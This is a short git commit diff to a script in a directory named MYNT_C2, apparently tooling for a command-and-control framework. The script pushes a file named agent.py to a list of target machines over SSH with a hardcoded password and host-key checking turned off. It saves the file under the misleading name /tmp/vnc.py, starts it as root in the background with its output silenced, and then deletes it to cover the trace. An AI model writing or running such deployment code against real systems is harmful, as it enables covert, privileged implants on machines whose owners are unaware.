dde1ef5ff1c79ecaefa4060a992cc1fab0c09d1c
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-04-08 20:41:20 -0400

    deployscript fix

--- MYNT_C2/deploy_MYNT.sh
+++ MYNT_C2/deploy_MYNT.sh
@@ -7,12 +7,11 @@ PASS="changeme"
 for TARGET in "${TARGETS[@]}"; do
     echo "[$TARGET] Deploying..."
     sshpass -p "$PASS" scp -o StrictHostKeyChecking=no ./agent.py ${USER}@${TARGET}:/tmp/vnc.py
-    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no ${USER}@${TARGET} "\
-    echo \"$PASS\" | sudo -S bash -c '
-        set -e
-
-        echo \"$PASS\" | sudo -S nohup python3 /tmp/vnc.py > /dev/null 2>&1 &
-        sudo rm /tmp/vnc.py
+    sshpass -p "changeme" ssh -o StrictHostKeyChecking=no ${USER}@${TARGET} "\
+    echo 'changeme' | sudo -S bash -c '
+        nohup python3 /tmp/vnc.py > /dev/null 2>&1 &
+        sleep 1
+        rm -f /tmp/vnc.py
     '
     "
     echo "[$TARGET] Deployment completed"
